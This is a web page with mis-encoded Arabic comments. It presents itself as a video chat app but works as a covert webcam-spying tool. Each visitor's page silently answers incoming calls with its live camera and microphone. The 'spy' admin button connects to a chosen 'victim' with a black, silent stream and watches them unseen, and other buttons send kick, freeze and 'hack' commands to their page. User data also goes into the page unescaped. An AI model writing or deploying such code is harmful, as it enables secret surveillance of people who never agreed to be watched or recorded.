<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Real Server Chat | Firebase</title>
    
    <!-- Ù…ÙƒØªØ¨Ø§Øª PeerJS Ùˆ Firebase -->
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; }
        body { background: #050505; color: #0f0; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }

        /* Ø§Ù„Ø´Ø§Ø´Ø© Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ© */
        #mainInterface { display: flex; height: 100%; flex-direction: column; }
        .video-container { flex: 1; display: flex; border-bottom: 2px solid #0f0; position: relative; }
        .vid-box { flex: 1; border-right: 1px solid #0f0; position: relative; background: #000; }
        video { width: 100%; height: 100%; object-fit: cover; }
        .label { position: absolute; bottom: 10px; left: 10px; background: rgba(0,0,0,0.8); padding: 5px; color: white; border-radius: 5px; }

        /* Ø²Ø± Ø§Ù„Ø£Ø¯Ù…Ù† */
        #adminBtn {
            position: fixed; top: 10px; right: 10px; z-index: 9999;
            background: #b00; color: white; border: 2px solid red; padding: 10px 20px;
            font-weight: bold; cursor: pointer; border-radius: 5px;
            animation: pulse 2s infinite;
        }
        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(255, 0, 0, 0.7); } 70% { box-shadow: 0 0 0 10px rgba(255, 0, 0, 0); } 100% { box-shadow: 0 0 0 0 rgba(255, 0, 0, 0); } }

        /* Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ… */
        #adminPanel {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.95); z-index: 10000;
            display: none; flex-direction: column; padding: 20px;
        }
        
        .panel-header { display: flex; justify-content: space-between; border-bottom: 1px solid red; padding-bottom: 10px; margin-bottom: 20px; }
        
        .online-list {
            flex: 1; overflow-y: auto; border: 1px solid #333; padding: 10px; background: #111;
        }

        .user-row {
            display: flex; justify-content: space-between; align-items: center;
            background: #222; margin-bottom: 5px; padding: 10px; border-left: 3px solid #0f0;
        }
        .user-row span { color: white; font-size: 1.1rem; }
        
        .btn-action { padding: 5px 10px; cursor: pointer; border: none; font-weight: bold; margin-left: 5px; }
        .btn-spy { background: #330; color: yellow; }
        .btn-kick { background: #500; color: white; }
        .btn-call { background: #005; color: white; }

        /* ØªØ£Ø«ÙŠØ±Ø§Øª Ø§Ù„Ø¶Ø­ÙŠØ© */
        body.hacked { filter: invert(1); }
        body.frozen { pointer-events: none; opacity: 0.5; }

        /* Ù…Ø¹Ù„ÙˆÙ…Ø§ØªÙŠ */
        #myStatus { position: absolute; top: 10px; left: 10px; color: #777; z-index: 5; background: black; padding: 5px; }
    </style>
</head>
<body>

    <div id="myStatus">My ID: <span id="myIdDisplay" style="color:white">...</span> | Status: <span id="connStatus" style="color:red">Offline</span></div>

    <!-- Ø²Ø± ÙØªØ­ Ø§Ù„Ù„ÙˆØ­Ø© -->
    <button id="adminBtn" onclick="togglePanel()">ğŸ‘‘ SERVER ADMIN</button>

    <!-- Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ… Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠØ© -->
    <div id="adminPanel">
        <div class="panel-header">
            <h2 style="color:red;">ğŸ”¥ REAL-TIME SERVER CONTROL</h2>
            <button onclick="togglePanel()" style="background:white; border:none; padding:5px 20px; cursor:pointer;">CLOSE X</button>
        </div>

        <h3 style="color:#0f0; margin-bottom:10px;">ğŸŸ¢ ONLINE USERS (LIVE)</h3>
        <div class="online-list" id="usersList">
            <div style="text-align:center; color:#555; margin-top:20px;">Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ø§Ù„Ø³ÙŠØ±ÙØ±...</div>
        </div>
    </div>

    <!-- ÙˆØ§Ø¬Ù‡Ø© Ø§Ù„ÙÙŠØ¯ÙŠÙˆ -->
    <div id="mainInterface">
        <div class="video-container">
            <div class="vid-box">
                <video id="localVideo" autoplay muted></video>
                <div class="label">ME</div>
            </div>
            <div class="vid-box">
                <video id="remoteVideo" autoplay></video>
                <div class="label">TARGET</div>
            </div>
        </div>
    </div>

    <script>
        // =======================================================
        // 1. Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ø³ÙŠØ±ÙØ± (FIREBASE CONFIG) - Ø¶Ø¹ Ø¥Ø¹Ø¯Ø§Ø¯Ø§ØªÙƒ Ù‡Ù†Ø§
        // =======================================================
        const firebaseConfig = {
            apiKey: "Ø¶Ø¹_API_KEY_Ù‡Ù†Ø§",
            authDomain: "YOUR_PROJECT.firebaseapp.com",
            databaseURL: "https://YOUR_PROJECT-default-rtdb.firebaseio.com",
            projectId: "YOUR_PROJECT",
            storageBucket: "YOUR_PROJECT.appspot.com",
            messagingSenderId: "123456789",
            appId: "1:123456789:web:xxxxxx"
        };
        // Ù…Ù„Ø§Ø­Ø¸Ø©: Ø¥Ø°Ø§ Ù„Ù… ØªØ¶Ø¹ Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø£Ø¹Ù„Ø§Ù‡ØŒ Ù„Ù† ØªØ¹Ù…Ù„ Ø§Ù„Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠØ©.

        // ØªÙ‡ÙŠØ¦Ø© Firebase
        try {
            firebase.initializeApp(firebaseConfig);
            var db = firebase.database();
            console.log("Firebase Connected");
        } catch(e) {
            console.error("Firebase Error: ØªØ£ÙƒØ¯ Ù…Ù† ÙˆØ¶Ø¹ Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„ØµØ­ÙŠØ­Ø©", e);
            alert("ØªÙ†Ø¨ÙŠÙ‡: Ù„Ù… ÙŠØªÙ… Ø±Ø¨Ø· Ø§Ù„Ø³ÙŠØ±ÙØ±. Ø§Ù„Ù‚Ø§Ø¦Ù…Ø© Ù„Ù† ØªØ¹Ù…Ù„ Ø­ØªÙ‰ ØªØ¶Ø¹ Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Firebase ÙÙŠ Ø§Ù„ÙƒÙˆØ¯.");
        }

        // =======================================================
        // 2. Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„ (PeerJS)
        // =======================================================
        const myId = Math.floor(100000 + Math.random() * 900000).toString(); // Ø±Ù‚Ù… Ø¹Ø´ÙˆØ§Ø¦ÙŠ Ø·ÙˆÙŠÙ„
        document.getElementById('myIdDisplay').innerText = myId;

        let peer = new Peer(myId);
        let conn, call, localStream;

        // ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
        navigator.mediaDevices.getUserMedia({video:true, audio:true}).then(stream => {
            localStream = stream;
            document.getElementById('localVideo').srcObject = stream;
        });

        peer.on('open', id => {
            document.getElementById('connStatus').innerText = "Online âœ…";
            document.getElementById('connStatus').style.color = "#0f0";
            
            // ğŸ”¥ Ø¥Ø¶Ø§ÙØ© Ù†ÙØ³ÙŠ Ù„Ù„Ø³ÙŠØ±ÙØ± Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠ ğŸ”¥
            if(typeof db !== 'undefined') {
                const userRef = db.ref('online_users/' + id);
                userRef.set({
                    id: id,
                    device: navigator.platform,
                    time: Date.now()
                });
                // Ø­Ø°Ù Ù†ÙØ³ÙŠ Ø¹Ù†Ø¯ Ø§Ù„Ø®Ø±ÙˆØ¬ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹
                userRef.onDisconnect().remove();
            }
        });

        // Ø§Ø³ØªÙ‚Ø¨Ø§Ù„ Ø§Ù„Ø§ØªØµØ§Ù„
        peer.on('connection', c => {
            conn = c;
            setupData();
        });

        peer.on('call', incoming => {
            incoming.answer(localStream);
            call = incoming;
            call.on('stream', rs => document.getElementById('remoteVideo').srcObject = rs);
        });

        // =======================================================
        // 3. Ù„ÙˆØ­Ø© Ø§Ù„Ø£Ø¯Ù…Ù† (Ù…Ø±Ø§Ù‚Ø¨Ø© Ø§Ù„Ø³ÙŠØ±ÙØ±)
        // =======================================================
        
        // Ø§Ù„Ø§Ø³ØªÙ…Ø§Ø¹ Ù„Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠØ©
        if(typeof db !== 'undefined') {
            db.ref('online_users').on('value', snapshot => {
                const users = snapshot.val();
                renderOnlineList(users);
            });
        }

        function renderOnlineList(users) {
            const listDiv = document.getElementById('usersList');
            listDiv.innerHTML = '';

            if(!users) {
                listDiv.innerHTML = '<div style="text-align:center; color:#555;">Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ø£Ø­Ø¯ Ø£ÙˆÙ†Ù„Ø§ÙŠÙ† Ø³ÙˆØ§Ùƒ.</div>';
                return;
            }

            Object.keys(users).forEach(userId => {
                if(userId === myId) return; // Ù„Ø§ ØªØ¸Ù‡Ø± Ù†ÙØ³ÙŠ

                const user = users[userId];
                const row = `
                    <div class="user-row">
                        <div>
                            <span style="font-weight:bold; color:#0f0;">ID: ${user.id}</span>
                            <br><span style="font-size:0.8rem; color:#777;">Device: ${user.device}</span>
                        </div>
                        <div>
                            <button class="btn-action btn-spy" onclick="spyOn('${user.id}')">ğŸ‘ï¸ ØªØ¬Ø³Ø³</button>
                            <button class="btn-action btn-call" onclick="connectTo('${user.id}')">ğŸ“ Ø§ØªØµØ§Ù„</button>
                            <button class="btn-action btn-kick" onclick="kickUser('${user.id}')">ğŸš« Ø·Ø±Ø¯</button>
                        </div>
                    </div>
                `;
                listDiv.innerHTML += row;
            });
        }

        function togglePanel() {
            const p = document.getElementById('adminPanel');
            p.style.display = (p.style.display === 'flex') ? 'none' : 'flex';
        }

        // =======================================================
        // 4. ÙˆØ¸Ø§Ø¦Ù Ø§Ù„ØªØ­ÙƒÙ… (Spy, Call, Kick)
        // =======================================================

        function connectTo(id) {
            conn = peer.connect(id);
            conn.on('open', () => {
                call = peer.call(id, localStream);
                call.on('stream', rs => document.getElementById('remoteVideo').srcObject = rs);
                setupData();
                togglePanel();
            });
        }

        function spyOn(id) {
            // Ø¥Ù†Ø´Ø§Ø¡ Ø´Ø§Ø´Ø© Ø³ÙˆØ¯Ø§Ø¡
            const canvas = document.createElement('canvas');
            canvas.width=100; canvas.height=100;
            const ctx = canvas.getContext('2d'); ctx.fillStyle="black"; ctx.fillRect(0,0,100,100);
            const blackStream = canvas.captureStream(30);
            // Ø¥Ø¶Ø§ÙØ© ØµÙˆØª ØµØ§Ù…Øª
            const ac = new AudioContext(); const dest = ac.createMediaStreamDestination();
            blackStream.addTrack(dest.stream.getAudioTracks()[0]);

            call = peer.call(id, blackStream);
            call.on('stream', rs => {
                document.getElementById('remoteVideo').srcObject = rs; // Ø£Ø±Ù‰ Ø§Ù„Ø¶Ø­ÙŠØ©
                document.getElementById('localVideo').srcObject = blackStream; // Ø´Ø§Ø´ØªÙŠ Ø³ÙˆØ¯Ø§Ø¡
                togglePanel();
            });
            // Ù†ÙØªØ­ Ù‚Ù†Ø§Ø© Ø¨ÙŠØ§Ù†Ø§Øª Ø£ÙŠØ¶Ø§Ù‹ Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø£ÙˆØ§Ù…Ø±
            conn = peer.connect(id);
        }

        function kickUser(id) {
            // Ù†ØªØµÙ„ Ø¨Ù‡ ÙÙ‚Ø· Ù„Ø·Ø±Ø¯Ù‡
            const tempConn = peer.connect(id);
            tempConn.on('open', () => {
                tempConn.send({type: 'CMD', action: 'KICK'});
                setTimeout(() => tempConn.close(), 500);
                alert("ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø£Ù…Ø± Ø§Ù„Ø·Ø±Ø¯ Ø¥Ù„Ù‰: " + id);
            });
        }

        // =======================================================
        // 5. Ø§Ø³ØªÙ‚Ø¨Ø§Ù„ Ø§Ù„Ø£ÙˆØ§Ù…Ø± (Ø¬Ø§Ù†Ø¨ Ø§Ù„Ø¶Ø­ÙŠØ©)
        // =======================================================
        function setupData() {
            conn.on('data', data => {
                if(data.type === 'CMD') executeCmd(data.action);
            });
        }

        function executeCmd(action) {
            if(action === 'KICK') {
                document.body.innerHTML = '<h1 style="color:red; text-align:center; margin-top:20%;">ØªÙ… Ø·Ø±Ø¯Ùƒ Ù…Ù† Ø§Ù„Ø³ÙŠØ±ÙØ±!</h1>';
                setTimeout(() => location.reload(), 2000);
            }
            if(action === 'FREEZE') document.body.classList.add('frozen');
            if(action === 'HACK') document.body.classList.add('hacked');
        }

    </script>
</body>
</html>
